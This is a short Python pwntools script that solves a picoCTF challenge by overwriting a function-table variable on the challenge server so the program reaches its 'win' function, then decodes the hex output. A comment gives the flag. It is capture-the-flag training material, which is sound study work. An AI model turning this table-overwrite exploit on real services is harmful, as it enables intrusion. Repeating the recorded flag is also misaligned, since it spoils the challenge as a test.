from pwn import *

con = remote("saturn.picoctf.net", 61663)
tables = ["print_table", "read_variable", "write_variable", "win"]
func_table = "".join([entry + ((32 - len(entry))* " ") for entry in tables])
con.sendlineafter(b"==>",b"3")
con.sendlineafter(b"write: ",b"func_table")
con.sendlineafter(b"variable: ",b'"' + func_table.encode() + b'"')
con.sendlineafter(b"==>", b"4")
hexed = con.recvline().strip().decode().split(" ")
hexed = "".join([chr(int(hexx[2:],16)) for hexx in hexed])
print(hexed)
# picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}
